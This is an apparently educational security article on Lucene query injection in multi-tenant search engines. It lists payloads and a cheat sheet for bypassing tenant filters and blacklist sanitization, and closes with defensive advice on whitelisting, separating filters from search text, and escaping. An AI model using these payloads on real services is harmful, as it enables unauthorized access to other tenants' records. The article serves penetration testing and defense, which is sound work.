# Lucene injection

## Introduction
There are many multi-tenant systems, and most systems provide some kind of full text search capability to search records.

Many of the search engines, like Apache Solr, Elastic Search, Kibana dashboards, even AWS IoT Fleet Index are based on the Lucene query syntax. Although there are almost no literature available on penetration testing these systems.

## Attacks
While the injection nature of attacks can lead to even more severe vulnerabilities like Remote Code Execution, in this article we are going to focus on Broken Authorization only. So, our intention is to get over the tenant boundary and list all records regardless of which tenant they belong to and we are going to look at different techniques to achieve that.

Let's use the following query as a starting point for most examples, which includes a filter to a specific tenant `1337` prefilled by the system, and a search text `hello` where a `*` is appended to the end to make it a *starts with* kind of query:
```
attributes.tenantId:"1337" AND hello*
```

### Match all with `OR`
Although the query starts with a restrictive filter and so seemingly impossible to break out, according to the Lucene grammar, `OR` has lower precedence than `AND`,
so even if the query has some filters preset, the whole meaning of the query can be changed to match all records and ignore previous the filters:
```
Query ::= DisjQuery ( DisjQuery )*
DisjQuery ::= ConjQuery ( OR ConjQuery )*
ConjQuery ::= ModClause ( AND ModClause )*
```

So lets introduce a sub query which is always evaluates to true.

Query: `* OR `

```
attributes.tenantId:"1337" AND * OR *
```

### Quotes: escape
Let's look at the following example, where we can fill in a quoted filter value:
```
attributes.tenantId:"1337" AND attributes.property:"value" AND hello*
```

Like in any other SQL-like injection, we can simply close the quotes and inject code instead of data. We shouldn't forget to close the remaining open quote.

- Property: `" OR * OR NOT "`
- Query: `` (empty)

```
attributes.tenantId:"1337" AND attributes.property:"" OR * OR NOT "" AND *
```

Some dialects allow comments, in those cases the injection payload can be both broader and simplified:
Property: `" OR *//`
```
attributes.tenantId:"1337" AND attributes.property:"" OR *//" AND *
```

### Wildcard (in a property): match all
If tenant ID can be set from outside, the wildcard character `*` can be used to match all, like this:

- Tenant ID: `*`
- Query: `` (empty)

```
attributes.tenantId:"*" AND *
```

### `OR` is forbidden (case insensitive)
While the default grammar defines the *or* operator as `"OR"` and it is case sensitive, some dialects are case insensitive, so `or`, `oR` or `Or` can be used as well:

Query: `* oR `

```
attributes.tenantId:"*" AND * oR *
```

### `OR` is forbidden (removed)
If `OR` is removed, we still have options to include it in the query. We can easily construct a payload which after `OR` is removed and collapses, a new `OR` emerges:

Query: `* OORR `

```
attributes.tenantId:"*" AND * OR *
```

### `OR` is forbidden (really?)
If all variations of the word `OR` is filtered, there is still a plan B. The grammar defines the *or* operator as the following:
```
<OR:            ("OR" | "||") >
```

So we can simply use `||` instead of `OR` to achieve the same effect:

Query: `* || `

```
attributes.tenantId:"*" AND * || *
```

### Whitespace is forbidden (really, but almost)
Space is a very important in the Lucene grammar, because it separates expressions.

For the word *whitespace* people usually think only some basic whitespace characters like ` ` (space), `\t` and `\n`; while there are quite a lot other whitespace characters as well.

And while the simple Lucene parser recognizes only these basic characters:
```
<#_WHITESPACE: ( " " | "\t" | "\n" | "\r" | "\u3000") >
```
some dialects, like [AWS Fleet Index](https://docs.aws.amazon.com/iot/latest/developerguide/query-syntax.html) defines whitespace differently:
- Search is case insensitive. Words are separated by white-space characters as defined by Java's Character.isWhitespace(int).

So, for example, if spaces are filtered on a preceding layer in JavaScript using [`/\s/g`](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Guide/Regular_Expressions/Character_Classes), while the Lucene syntax parser is written in Java, and uses [`Char.isWhiteSpace`](https://docs.oracle.com/javase/7/docs/api/java/lang/Character.html), there are many differences:

| Character | JavaScript `\s` | Java `Char.isWhiteSpace` |
| --------- | --------------- | ------------------------ |
| ' '       | Yes             | Yes                      |
| \t        | Yes             | Yes                      |
| \n        | Yes             | Yes                      |
| ...       | ...             | ...                      |
| \u001c    | No              | Yes                      |
| \u001d    | No              | Yes                      |
| \u001e    | No              | Yes                      |
| \u001f    | No              | Yes                      |
| ...       | ...             | ...                      |
| \u3000    | Yes             | Yes                      |

If the filter catches only a subset of the meaningful characters in the grammar, like in this example, it can be bypassed:

Query: `*\u001COR\u001D` (C-style notation of Unicode characters)

```
attributes.tenantId:"*" AND *\u001COR\u001D*
```

### Whitespace is forbidden (really)
Even if whitespace is forbidden, a *Clause* can be composed in many ways, for example *Grouping* can be still used:
```
Clause ::= FieldRangeExpr | (FieldName (':' | '='))? (Term | GroupingExpr)
GroupingExpr ::= '(' Query ')' ('^' <NUMBER>)?
```

The query would look like this:

Query: `(*)OR(*)`
```
attributes.tenantId:"*" AND (*)OR(*)*
```

### Whitespace is forbidden (replaced to wildcard)
In some implementations, they might replace whitespace to wildcards, so the input query can match the same field but different parts. In this case, we simply use whitespace instead of wildcards:

Query: `( )OR( )`
```
attributes.tenantId:"*" AND (*)OR(*)*
```

### Parenthesis: escape
Some implementations might use parenthesis to group multiple phrases into a single clause, so OR is scoped to that match only, and not the whole query.

Query: `abc def`
```
attributes.tenantId:"*" AND (abc def)
```

But this limitation can be easily overcome, like quotes:

Query: `*) OR (*`
```
attributes.tenantId:"*" AND (*) OR (*)
```

### Minimum required search text length
Some systems restrict search text to be at least 3 characters long, so you can't dump all data at once:

Query: `abc` (minimum required 3 characters long)

```
abc*
```

But this limitation can be easily overcome by providing the wildcard character repeatedly.

Query: `***` (minimum required 3 characters long)

```
****
```

## Cheat sheet
Variations of the following building blocks:
 - `OR` or `Or` or `||`
 - ` ` or `*`
 - `(*)` or `*)OR(*` or `*)OR(*)//`

For example:
 - `(*)OR(*)`
 - `(*)Or(*)`
 - `(*)||(*)`
 - `( )||( )`
 - `*)||(*`

## Protection

### Weak sanitization
Blacklisting provides no protection as shown in this article.

### Strict sanitization
Only whitelisting can provide some level of protection, like allow only letters as search text and nothing else. But it still has two disadvantages:
 - it introduces usability issues, because limitations are aligned to the grammar of the query language of an underlying technology many layers below
 - validation of character classes is not as easy as `A <= character <= Z`:
   - if `A` and `Z` marks the bounds, it doesn't include accents, so it is going to introduce issues in a multi-lingual environment
   - accepting all *Letters* may have the same edge cases as *Whitespaces* described in the *Attacks* section, as different frameworks may define letter characters differently

### Separation of user input and filters
Some technologies like [Microsoft Azure Search](https://docs.microsoft.com/en-us/rest/api/searchservice/search-documents#url-encoding-recommendations) requires the separation of filters and search text by design to help prevent injection attacks. Their API is separated to a `$filter` (to include static filters like tenant restriction) and a `search` field (for the text typed by the user).

In that case, an API call would look like this:
 - `$filter`: `attributes.tenantId:"1337"` (although this may still be injected, if input data is not strongly typed)
 - `search`: `hello` (anything can be included here safely, it won't affect the overall filter)

### Encoding (or escaping)
When data is inserted into code, it must be preserved as data and we have to prevent to change the meaning of the surrounding code. Only proper encoding provides full protection, while doesn't restrict data in any way.

The best way to encode data is to use the toolset provided by the SDK, like
`escapeQueryChars` in [ClientUtils.java](https://github.com/apache/solr/blob/main/solr/solrj/src/java/org/apache/solr/client/solrj/util/ClientUtils.java) for Apache Solr.



## References
- [Query Parser Syntax](https://lucene.apache.org/core/4_8_1/queryparser/org/apache/lucene/queryparser/classic/package-summary.html?is-external=true#Overview) in Apache Lucene documentation
- [StandardSyntaxParser.jj](https://github.com/apache/lucene/blob/main/lucene/queryparser/src/java/org/apache/lucene/queryparser/flexible/standard/parser/StandardSyntaxParser.jj) in [Apache Lucene](https://github.com/apache/lucene)
- [ClientUtils.java](https://github.com/apache/solr/blob/main/solr/solrj/src/java/org/apache/solr/client/solrj/util/ClientUtils.java) in [Apache Solr](https://github.com/apache/solr)
- [JavaScript Regular Expressions: Character classes](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Guide/Regular_Expressions/Character_Classes) on MDN
